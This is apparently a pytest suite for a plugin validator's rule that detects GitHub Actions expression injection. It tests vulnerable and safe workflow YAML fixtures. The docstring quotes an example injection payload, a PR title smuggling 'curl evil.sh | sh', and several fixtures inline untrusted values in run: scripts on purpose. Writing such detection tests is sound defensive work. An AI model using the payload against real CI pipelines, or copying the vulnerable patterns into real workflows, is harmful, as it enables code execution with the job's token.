#!/usr/bin/env python3
"""TRDD-WT0FLTMM — RC-WORKFLOW-EXPR-INJECT (GitHub-Actions expression injection).

A `${{ ... }}` expression is substituted by the runner as raw TEXT, before the
shell (or the github-script JS engine) parses the body. So an untrusted value
interpolated straight into a ``run:`` script is not an argument — it is source
code, and a PR titled ``a"; curl evil.sh | sh; #`` executes on the runner with
the job's token (CWE-94).

Two-sided coverage:
  * FIRING side  — untrusted contexts (``github.event.*``, ``github.head_ref``,
    ``inputs.*``, ``steps.*.outputs.*``, ``needs.*.outputs.*``) inline in a
    ``run:`` body or an ``actions/github-script`` ``script:`` body.
  * SAFE side    — the same value bound in ``env:`` and read as ``"$VAR"``;
    static contexts (``matrix.*``, ``runner.*``, ``github.workflow``,
    ``secrets.*`` in ``env:``/``with:``); expressions in non-shell keys
    (``if:``, ``name:``, ``with:``). None of these may fire.
"""

from __future__ import annotations

import json
import sys
from pathlib import Path

REPO_ROOT = Path(__file__).resolve().parent.parent
SCRIPTS = REPO_ROOT / "scripts"
if str(SCRIPTS) not in sys.path:
    sys.path.insert(0, str(SCRIPTS))


# ── Helpers ────────────────────────────────────────────────────────────────────


def _make_minimal_plugin(tmp_path: Path, name: str = "test-plugin") -> Path:
    p = tmp_path / name
    (p / ".claude-plugin").mkdir(parents=True)
    (p / ".claude-plugin" / "plugin.json").write_text(
        json.dumps(
            {
                "name": name,
                "version": "0.1.0",
                "description": "test",
                "author": {"name": "Tester", "email": "t@example.com"},
                "repository": f"https://github.com/Emasoft/{name}",
            }
        )
    )
    return p


def _write_workflow(plugin_root: Path, name: str, body: str) -> Path:
    wf_dir = plugin_root / ".github" / "workflows"
    wf_dir.mkdir(parents=True, exist_ok=True)
    path = wf_dir / name
    path.write_text(body, encoding="utf-8")
    return path


def _findings(plugin_root: Path) -> list:
    from cpv_validation_common import ValidationReport
    from validate_plugin import validate_workflow_expression_injection

    report = ValidationReport()
    validate_workflow_expression_injection(plugin_root, report)
    return [r for r in report.results if r.level == "MAJOR" and "RC-WORKFLOW-EXPR-INJECT" in r.message]


def _scan(tmp_path: Path, body: str) -> list:
    plugin = _make_minimal_plugin(tmp_path)
    _write_workflow(plugin, "ci.yml", body)
    return _findings(plugin)


# ── FIRING side ────────────────────────────────────────────────────────────────


def test_pr_title_inline_in_run_fires(tmp_path: Path) -> None:
    """The canonical repro: a PR title echoed inline in a run body."""
    findings = _scan(
        tmp_path,
        """\
name: ci
on: [pull_request]
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - run: echo "${{ github.event.pull_request.title }}"
""",
    )
    assert len(findings) == 1, [f.message for f in findings]
    assert "github.event.pull_request.title" in findings[0].message


def test_head_ref_inline_in_run_fires(tmp_path: Path) -> None:
    """``github.head_ref`` is attacker-chosen (the PR branch name)."""
    findings = _scan(
        tmp_path,
        """\
name: ci
on: [pull_request]
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - run: git checkout ${{ github.head_ref }}
""",
    )
    assert len(findings) == 1, [f.message for f in findings]
    assert "github.head_ref" in findings[0].message


def test_workflow_dispatch_input_inline_in_run_fires(tmp_path: Path) -> None:
    """A ``workflow_dispatch`` input is free-form text from the trigger."""
    findings = _scan(
        tmp_path,
        """\
name: release
on:
  workflow_dispatch:
    inputs:
      tag:
        required: true
jobs:
  cut:
    runs-on: ubuntu-latest
    steps:
      - run: |
          echo "tag=${{ inputs.tag }}" >> "$GITHUB_OUTPUT"
""",
    )
    assert len(findings) == 1, [f.message for f in findings]
    assert "inputs.tag" in findings[0].message


def test_step_output_inline_in_run_fires(tmp_path: Path) -> None:
    """A step output carries whatever the producing step wrote — untrusted."""
    findings = _scan(
        tmp_path,
        """\
name: ci
on: [push]
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - run: git commit -m "bump ${{ steps.plugin.outputs.version }}"
""",
    )
    assert len(findings) == 1, [f.message for f in findings]
    assert "steps.plugin.outputs.version" in findings[0].message


def test_needs_output_inline_in_run_fires(tmp_path: Path) -> None:
    findings = _scan(
        tmp_path,
        """\
name: ci
on: [push]
jobs:
  publish:
    runs-on: ubuntu-latest
    steps:
      - run: echo ${{ needs.build.outputs.artifact }}
""",
    )
    assert len(findings) == 1, [f.message for f in findings]


def test_github_script_body_fires(tmp_path: Path) -> None:
    """An ``actions/github-script`` ``script:`` body is a shell context too:
    the expression is spliced into the JS source before it is evaluated."""
    findings = _scan(
        tmp_path,
        """\
name: ci
on: [issue_comment]
jobs:
  triage:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/github-script@v7
        with:
          script: |
            const body = "${{ github.event.comment.body }}";
            console.log(body);
""",
    )
    assert len(findings) == 1, [f.message for f in findings]
    assert "github-script script:" in findings[0].message


def test_expression_inside_format_call_fires(tmp_path: Path) -> None:
    """A ``format('{0}', ...)`` wrapper does not sanitise anything — the `}`
    inside the format string must not truncate the expression scan."""
    findings = _scan(
        tmp_path,
        """\
name: ci
on: [pull_request]
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - run: echo ${{ format('{0}', github.event.issue.title) }}
""",
    )
    assert len(findings) == 1, [f.message for f in findings]


def test_run_comment_line_still_fires(tmp_path: Path) -> None:
    """A `#` shell comment is NOT inert: interpolation happens before the shell
    parses the body, so a payload containing a newline escapes the comment."""
    findings = _scan(
        tmp_path,
        """\
name: ci
on: [pull_request]
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - run: |
          # building ${{ github.event.pull_request.title }}
          make build
""",
    )
    assert len(findings) == 1, [f.message for f in findings]


def test_multiple_hits_reported_separately(tmp_path: Path) -> None:
    findings = _scan(
        tmp_path,
        """\
name: ci
on: [pull_request]
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - run: |
          echo "${{ github.event.pull_request.title }}"
          echo "${{ github.head_ref }}"
""",
    )
    assert len(findings) == 2, [f.message for f in findings]


# ── SAFE side (controls — none of these may fire) ───────────────────────────────


def test_env_mediated_is_safe(tmp_path: Path) -> None:
    """The documented fix: bind in ``env:``, read as a quoted shell variable."""
    findings = _scan(
        tmp_path,
        """\
name: ci
on: [pull_request]
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - name: Print title
        env:
          PR_TITLE: ${{ github.event.pull_request.title }}
          HEAD_REF: ${{ github.head_ref }}
          TAG: ${{ inputs.tag }}
          VERSION: ${{ steps.plugin.outputs.version }}
        run: |
          echo "$PR_TITLE"
          echo "$HEAD_REF $TAG $VERSION"
""",
    )
    assert not findings, [f.message for f in findings]


def test_static_contexts_in_run_are_safe(tmp_path: Path) -> None:
    """``matrix.*`` / ``runner.*`` / ``github.workflow`` / ``github.sha`` are
    not attacker-controlled, so they never fire even inline in a run body."""
    findings = _scan(
        tmp_path,
        """\
name: ci
on: [push]
jobs:
  build:
    runs-on: ${{ matrix.os }}
    strategy:
      matrix:
        os: [ubuntu-latest, macos-latest]
        python: ['3.12']
    steps:
      - run: |
          echo "${{ matrix.os }} ${{ matrix.python }} on ${{ runner.os }}"
          echo "workflow=${{ github.workflow }} sha=${{ github.sha }} repo=${{ github.repository }}"
""",
    )
    assert not findings, [f.message for f in findings]


def test_secrets_and_static_in_env_and_with_are_safe(tmp_path: Path) -> None:
    findings = _scan(
        tmp_path,
        """\
name: ci
on: [push]
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          token: ${{ secrets.MARKETPLACE_PAT }}
          ref: ${{ github.sha }}
      - name: Publish
        env:
          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
        run: gh release create "$TAG"
""",
    )
    assert not findings, [f.message for f in findings]


def test_untrusted_in_non_shell_keys_is_safe(tmp_path: Path) -> None:
    """``if:``, ``name:`` and ``with:`` are not shell contexts — an expression
    there is evaluated by the Actions engine, never spliced into a script."""
    findings = _scan(
        tmp_path,
        """\
name: ci
on: [pull_request]
jobs:
  build:
    if: github.event.pull_request.draft == false
    runs-on: ubuntu-latest
    steps:
      - name: Handle ${{ github.event.pull_request.title }}
        if: ${{ steps.check.outputs.changed == 'true' }}
        uses: peter-evans/repository-dispatch@v4
        with:
          client-payload: '{"plugin": "${{ steps.plugin.outputs.name }}"}'
""",
    )
    assert not findings, [f.message for f in findings]


def test_non_github_script_action_script_input_is_not_scanned(tmp_path: Path) -> None:
    """A ``script:`` input of some OTHER action is not a known shell context —
    only ``actions/github-script`` is treated as one."""
    findings = _scan(
        tmp_path,
        """\
name: ci
on: [push]
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: some-org/render-template@v1
        with:
          script: "title = ${{ github.event.issue.title }}"
""",
    )
    assert not findings, [f.message for f in findings]


def test_similar_but_distinct_token_is_safe(tmp_path: Path) -> None:
    """``github.event_name`` is an enumerated trigger name, not event DATA;
    the boundary also keeps ``mygithub.event.x`` from matching."""
    findings = _scan(
        tmp_path,
        """\
name: ci
on: [push]
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - run: echo "${{ github.event_name }} ${{ github.actor }} ${{ env.MARKETPLACE_REPO }}"
""",
    )
    assert not findings, [f.message for f in findings]


def test_no_workflows_dir_is_silent(tmp_path: Path) -> None:
    plugin = _make_minimal_plugin(tmp_path)
    assert not _findings(plugin)


# ── Dogfood: CPV's own workflows must be clean ─────────────────────────────────


def test_cpv_own_workflows_have_no_expression_injection() -> None:
    findings = _findings(REPO_ROOT)
    assert not findings, [f.message for f in findings]


# ── The emitted receiver snippet must pass the rule ────────────────────────────


def _yaml_fences(md: Path) -> list[str]:
    blocks: list[str] = []
    current: list[str] | None = None
    for line in md.read_text(encoding="utf-8").splitlines():
        if line.startswith("```yaml"):
            current = []
            continue
        if line.startswith("```") and current is not None:
            blocks.append("\n".join(current))
            current = None
            continue
        if current is not None:
            current.append(line)
    return blocks


def test_emitted_receiver_snippet_passes_the_rule(tmp_path: Path) -> None:
    """Task 2 of TRDD-WT0FLTMM: every receiver workflow the
    ``cpv-setup-marketplace-auto-notification`` skill emits must be
    env-mediated, i.e. produce ZERO findings under the new rule."""
    template = (
        REPO_ROOT
        / "skills"
        / "cpv-setup-marketplace-auto-notification"
        / "references"
        / "receiver-workflow-template.md"
    )
    fences = _yaml_fences(template)
    assert len(fences) >= 2, "expected the Layout A and Layout B receiver snippets"
    for idx, fence in enumerate(fences):
        plugin = _make_minimal_plugin(tmp_path / f"case{idx}")
        _write_workflow(plugin, "update-plugin-version.yml", fence + "\n")
        findings = _findings(plugin)
        assert not findings, f"receiver snippet #{idx}: {[f.message for f in findings]}"
